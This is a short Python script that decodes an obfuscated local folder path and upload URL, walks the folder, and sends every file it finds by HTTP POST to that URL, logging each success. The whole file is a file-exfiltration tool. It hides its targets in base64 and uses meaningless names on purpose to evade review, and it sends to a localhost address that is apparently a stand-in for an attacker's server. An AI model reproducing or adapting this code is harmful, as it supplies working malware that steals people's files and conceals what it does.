import os
import requests
import base64

# === Obfuscated base64 strings ===
b1 = base64.b64decode(b'QzpcVXNlcnNcREVMTFxEZXNrdG9wXGZpbGVzLmxvZw==').decode()  # C:\Users\DELL\Desktop\files.log
b2 = base64.b64decode(b'aHR0cDovL2xvY2FsaG9zdDo4MDgw').decode()  # http://localhost:8080

# === Obfuscated variable and function names ===
z = []
def x1():
    for r, d, f in os.walk(b1):
        for i in f:
            z.append(os.path.join(r, i))

def x2():
    for p in z:
        with open(p, 'rb') as f:
            data = {'file': (os.path.basename(p), f)}
            try:
                r = requests.post(b2, files=data)
                if r.status_code == 200:
                    print(f"[+] Sent: {p}")
                else:
                    print(f"[!] Failed: {p}")
            except Exception as e:
                print(f"[!] Error sending {p}: {e}")

if __name__ == '__main__':
    x1()
    x2()
